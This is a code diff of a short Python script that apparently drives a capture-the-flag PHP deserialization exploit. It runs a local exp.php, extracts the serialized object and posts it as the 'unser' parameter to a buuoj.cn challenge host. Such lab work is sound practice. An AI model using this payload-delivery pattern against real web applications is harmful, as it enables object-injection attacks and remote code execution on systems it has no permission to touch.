@@ -4,33 +4,29 @@ import os
 from urllib.parse import unquote
 import subprocess
 from requests_html import HTMLSession
+import re
+
+url = 'http://366a153f-115e-46e1-b214-49b94b3c423b.node4.buuoj.cn:81/'
+key = 'unser'
+php = r'D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe'
 
 s = HTMLSession()
+output = subprocess.getoutput(f'{php} exp.php')
 
-php_path = r'E:\Program files\php'
-os.environ['path'] = php_path + ';' + os.environ['path']
-# stdout = os.popen("php exp.php").read()  # 执行并输出命令的执行结果
-# urlencoded = stdout.split('\n')[-1]
-p = subprocess.Popen("php exp.php", shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE)
-urlencoded = p.stdout.readlines()[-1]
-print(urlencoded)
+ser = re.search(r'O:.*', output).group()
 
-url = 'http://192.168.61.141/1.php'
-proxies = {'http': 'http://127.0.0.1:8080'}
-# 方式1
-params = {'pks': unquote(urlencoded)}
-res = s.get(url, params=params)
-# 方式2
-# res = s.get(php + '?pks=' + urlencoded)
-
-# post
-# data = {
-#     "name": 'name',
-#     'phone': 'phone',
-#     'email': 'email'
-# }
-# url = url + '?cata=' + urlencoded
-# res = s.post(url, data=data)
+data = {key: ser}
 
 
-print(res.text)
+def get():
+    res = s.post(url, params=data)
+    return res.text
+
+
+def post():
+    res = s.post(url, data=data)
+    return res.text
+
+
+# print(get())
+print(post())
